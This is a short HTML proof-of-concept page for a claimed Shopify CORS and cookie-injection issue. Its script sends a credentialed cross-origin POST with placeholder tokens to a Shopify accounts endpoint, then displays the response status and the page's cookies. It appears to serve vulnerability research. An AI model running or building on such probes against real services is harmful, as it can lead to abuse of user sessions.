<html>
<head>
  <title>Shopify CORS + Cookie Injection PoC</title>
</head>
<body>
  <h1>Shopify CORS + Cookie Injection PoC</h1>
  <p>HTTP Status: <span id="status">...</span></p>
  <p>Cookies for this domain:</p>
  <pre id="cookies"></pre>

  <script>
    fetch("https://accounts.shopify.com/.well-known/dux", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        multiTrackToken: "test",
        sessionToken: "test",
        events: []
      })
    })
    .then(res => {
      document.getElementById("status").innerText = res.status;
      document.getElementById("cookies").innerText = document.cookie;
    })
    .catch(err => {
      document.getElementById("status").innerText = "Error";
    });
  </script>
</body>
</html>
